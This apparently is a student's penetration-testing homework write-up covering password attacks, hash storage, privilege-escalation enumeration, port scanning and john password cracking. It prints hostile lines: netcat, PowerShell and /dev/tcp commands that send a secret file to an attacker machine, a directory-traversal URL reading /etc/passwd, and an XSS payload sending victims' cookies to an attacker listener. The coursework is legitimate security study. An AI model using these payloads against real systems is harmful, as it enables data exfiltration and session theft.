
### 1. Main types of password attacks?

* **Dictionary Attack:** Uses a wordlist (common passwords, target-specific words) to guess passwords. Can be used for cracking captured hashes or attacking logins when common/themed passwords are suspected.
* **Brute-Force Attack:** Tries every possible character combination. It's just a  default fallback option when dictionary attacks fail, or against systems with short/simple password requirements.

### 2. Bits per hash type?

* a. MD5: `128` bits
* b. Unsalted SHA1: `160` bits
* c. SHA256: `256` bits
* d. NTLMv2: `128` bits
* e. Salted SHA1: `160` bits

### 3. First thing to do after popping a basic user shell in Linux (goal = root)?

Perform **local enumeration** to gather information about the system and user for privilege escalation vectors. Commands like `uname -a`, `ps aux`, `sudo -l`, `find / -perm -u=s -type f 2>/dev/null` help understand the environment and find potential weaknesses.

### 4. Where are users and password hashes stored?

* a. **Windows:** Primarily in the SAM file (`C:\Windows\System32\config\SAM`). Also LSASS memory and `NTDS.dit` (Domain Controllers).
* b. **Linux:** User info in `/etc/passwd`, hashes in `/etc/shadow`.

### 5. Transfer `/secret/passwordsandstuff.bin` from remote host (blocks incoming) to testing machine?
* **a. Using netcat:**
    * Listner: `nc -lvnp <LISTENING_PORT> > passwordsandstuff.bin`
    * Sender:  `nc <TESTING_MACHINE_IP> <LISTENING_PORT> < /secret/passwordsandstuff.bin`

* **b. Using PowerShell classes:**
    * Listener:
        ```powershell
        $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, <LISTENING_PORT>); $listener.Start()
        $client = $listener.AcceptTcpClient(); $stream = $client.GetStream()
        $fileStream = [System.IO.FileStream]::new(".\passwordsandstuff.bin", [System.IO.FileMode]::Create)
        $buffer = [byte[]]::new(1024); while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) { $fileStream.Write($buffer, 0, $bytesRead) }
        $fileStream.Close(); $stream.Close(); $client.Close(); $listener.Stop()
	  ```
	  
	  ```
	  
	* Sender:	
```powershell
        $client = New-Object System.Net.Sockets.TcpClient("<TESTING_MACHINE_IP>", <LISTENING_PORT>); $stream = $client.GetStream()
        $fileStream = [System.IO.FileStream]::new("/secret/passwordsandstuff.bin", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $buffer = [byte[]]::new(1024); while (($bytesRead = $fileStream.Read($buffer, 0, $buffer.Length)) -gt 0) { $stream.Write($buffer, 0, $bytesRead) }
        $fileStream.Close(); $stream.Close(); $client.Close()
```
        
* **c. Using native bash tools (no nc/ncat/socat):**
    *  Listener: (Still usually use `nc`): `nc -lvnp <LISTENING_PORT> > passwordsandstuff.bin`
    * Sender: Use bash TCP redirection:
        ```bash
        cat /secret/passwordsandstuff.bin > /dev/tcp/<TESTING_MACHINE_IP>/<LISTENING_PORT>
        ```

### 6. How to check lockout settings before password guessing?

* a. **Windows:** Run `net accounts`. Check "Lockout threshold", "Lockout duration", "Lockout observation window". In AD, check Group Policy (e.g., `Get-ADDefaultDomainPasswordPolicy`).
* b. **Linux:** Check PAM configs in `/etc/pam.d/` for `pam_tally2`/`pam_faillock` settings (`deny`, `unlock_time`). Use `pam_tally2 --user <username>` or `faillock --user <username>` to check status.

### 7. Data link layer attack tool?

* a. **Windows tool reviewed?** Cain & Abel (using ARP Poison Routing).
* b. **Kali equivalent?** Ettercap, arpspoof, Bettercap.
* c. **Kind of packets sent?** Forged ARP Reply packets (to poison target ARP cache).

### 8. OS where Rainbow Tables likely won't work well? Why?

Modern Linux (or macOS/Windows) because they use **salting**. Each password hash includes a unique salt, so generic precomputed tables won't match.

### 9. What happens if you use the same reduction function building a rainbow table?

It causes many **collisions** and **chain merges**, significantly reducing the table's coverage and effectiveness.

### 10. Crack Alice's password from `hw3.pcap`?

1.  **Extract Hash:** I opened `hw3.pcap` in Wireshark then filtered for `smb || ntlmssp`. Next I found Alice's NTLM authentication handshake and extracted the challenge/response components (username, domain, challenge, response hash/data).
2.  **Cain:** I then imported Alice's NTLM session data into Cracker tab and ran Dictionary attack on Alice's entry.
![[alice.png]]
### 11. PowerShell script to scan ports 8075-8085 on subnet 10.10.0.32/29?

```powershell
# Function to scan specified ports on a subnet
function Invoke-TcpPortScan {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)][string]$SubnetCidr,
        [Parameter(Mandatory=$true)][int[]]$Ports
    )
    process {
        # Calculate IP Range (simplified example - requires proper subnet math)
        # For 10.10.0.32/29, usable IPs are 10.10.0.33 to 10.10.0.38
        $ipRange = @("10.10.0.33", "10.10.0.34", "10.10.0.35", "10.10.0.36", "10.10.0.37", "10.10.0.38") # Manual for this example

        foreach ($targetIp in $ipRange) {
            $openPorts = @()
            Write-Verbose "Scanning $targetIp..."
            foreach ($port in $Ports) {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                try {
                    $connectResult = $tcpClient.BeginConnect($targetIp, $port, $null, $null)
                    if ($connectResult.AsyncWaitHandle.WaitOne(200, $false)) {
                        $tcpClient.EndConnect($connectResult) | Out-Null
                        $openPorts += $port
                    }
                } catch { } finally { $tcpClient.Close() }
            } # End foreach port

            if ($openPorts.Count -gt 0) {
                [PSCustomObject]@{
                    IPAddress      = $targetIp
                    OpenPortsCount = $openPorts.Count
                    OpenPorts      = $openPorts -join ', '
                }
            }
        } # End foreach IP
    }
}

# --- Usage ---
$subnet = "10.10.0.32/29"
$portsToScan = 8075..8085
Invoke-TcpPortScan -SubnetCidr $subnet -Ports $portsToScan -Verbose
```
### 12. Edit URL to view `/etc/passwd`? Why might it work?

**URL:** `http://nbn.corp/hello.php?name=Alice&lang=en`
**PHP:** `include($lang . ".php");`

**Modified URL:**
`http://nbn.corp/hello.php?name=Alice&lang=../../../../../../etc/passwd`
(Or potentially `...passwd%00` on older PHP)

The `lang` parameter is directly used in `include()`. If not sanitized, directory traversal (`../`) can make `include()` attempt to load `/etc/passwd`. If readable by the web server, its content will be outputted into the web page from the client's side

### 13. XSS payload to evade "script" filter, steal cookies, and redirect?

**Payload:**
```html
<img src=x onerror="window.location='http://10.10.0.32:8080/?c='+document.cookie">
```

**Explanation:**
* Uses `<img src=x>` which fails, triggering `onerror`.
* The `onerror` JavaScript redirects the browser to the attacker's listener (`http://10.10.0.32:8080`).
* It appends the victim's cookies (`document.cookie`) to the redirect URL.
* Evades the filter because it doesn't contain the word "script".
![[xss.png]]
### 14. Multipart Question

* a. Commands to generate `hw3list.lst` (6-8 chars) from EFF page and links
First had to setup `cewl` and some specific gem files on Arch since it runs on ruby on rails

Installing `cewl` on arch
```bash
	pacman -Sy cewl
	gem install getoptlong
```
	
Although this didn't work for me so I had to add `getoptlong` to `cewl` Gemfile:	

```bash
	cd /opt/cewl
	echo "gem 'getoptlong'" >> Gemfilea
	bundle install
```
And then run `cewl`
```bash
    cewl -d 1 -m 6 --max_word_length 8 -w hw3list.lst https://www.eff.org/wp/digital-privacy-us-border-2017
```

* b. Crack 5+ passwords using `hw3list.lst` and different mangling rules
```bash
    # Basic wordlist attack
    john --wordlist=hw3list.lst hashedpasswords
```
![[Pasted image 20250503002658.png]]

> [!error] (KoreLogic took too long)
> `john --wordlist=hw3list.lst --rules=KoreLogic hashedpasswords`

Using Jumbo as my ruleset did the trick, although still took a while
```bash
    john --wordlist=hw3list.lst --rules=Jumbo hashedpasswords
```
![[Pasted image 20250503030545.png]]
```bash
    # Show cracked passwords
    john --show hashedpasswords
```
In the end I was able to crack 5 out 6 credentials
![[Pasted image 20250503051438.png]]

* c. Edit `john.conf` for custom rule `[a=4][e=3]` 
    Modified `/usr/share/john/john.conf`:
    ```ini
   [List.Rules:custom]
	:
	sa4
	se3
	
	A0"a"sa4
	A1"a"sa4
	A2"a"sa4
	A3"a"sa4
	A4"a"sa4
	A5"a"sa4
	A6"a"sa4
	A7"a"sa4
	
	A0"e"se3
	A1"e"se3
	A2"e"se3
	A3"e"se3
	A4"e"se3
	A5"e"se3
	A6"e"se3
	A7"e"se3
	
	A0"a"A1"a"sa4sa4
	A0"a"A2"a"sa4sa4
	A0"a"A3"a"sa4sa4
	A1"a"A2"a"sa4sa4
	A1"a"A3"a"sa4sa4
	A2"a"A3"a"sa4sa4
	
	A0"e"A1"e"se3se3
	A0"e"A2"e"se3se3
	A0"e"A3"e"se3se3
	A1"e"A2"e"se3se3
	A1"e"A3"e"se3se3
	A2"e"A3"e"se3se3
	
	A0"a"A0"e"sa4se3
	A0"a"A1"e"sa4se3
	A0"a"A2"e"sa4se3
	A1"a"A0"e"sa4se3
	A1"a"A1"e"sa4se3
	A1"a"A2"e"sa4se3
	A2"a"A0"e"sa4se3
	A2"a"A1"e"sa4se3
	A2"a"A2"e"sa4se3
	
	A0"a"A1"a"A0"e"sa4sa4se3
	A0"a"A1"a"A1"e"sa4sa4se3
	A0"a"A1"a"A2"e"sa4sa4se3
	
	A0"a"A0"e"A1"e"sa4se3se3
	A0"a"A0"e"A2"e"sa4se3se3
	A1"a"A0"e"A1"e"sa4se3se3
	A1"a"A0"e"A2"e"sa4se3se3
	A2"a"A0"e"A1"e"sa4se3se3
	A2"a"A0"e"A2"e"sa4se3se3
	
	sa@se3 
    ```
    
    Run using custom rule:
    ```bash
    john --wordlist=hw3list.lst --rules=custom hashedpasswords
    ```

 ![[Pasted image 20250503055712.png]]
In  the end I was unable to crack the last one